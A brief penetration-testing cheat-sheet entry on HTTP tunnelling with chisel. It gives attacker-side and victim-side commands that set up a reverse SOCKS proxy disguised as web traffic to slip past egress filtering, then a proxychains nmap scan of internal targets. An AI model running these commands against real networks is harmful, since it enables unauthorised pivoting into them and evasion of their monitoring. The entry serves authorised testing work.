# 14.02 HTTP Tunneling with Chisel

> Tunnel TCP/UDP through HTTP(S) with `chisel` in reverse SOCKS mode when egress only permits 443.

## Overview

Chisel tunnels TCP/UDP through HTTP(S), looking like benign web traffic. Reverse SOCKS mode is ideal when egress only allows HTTP/443 and you need to nmap from outside.

## Steps

- **Run server on attacker** — `chisel server --reverse`.
- **Run client on victim** — connects out + opens reverse SOCKS.
- **Use SOCKS5** via proxychains.

## Commands

### Chisel reverse SOCKS

```bash
# Attacker
./chisel server -p <LPORT> --reverse --auth <USER>:<PASS>
# Victim
./chisel client --auth <USER>:<PASS> <LHOST>:<LPORT> R:<PROXY-PORT>:socks
# Use
proxychains -q nmap -sT -p- <TARGET>
```
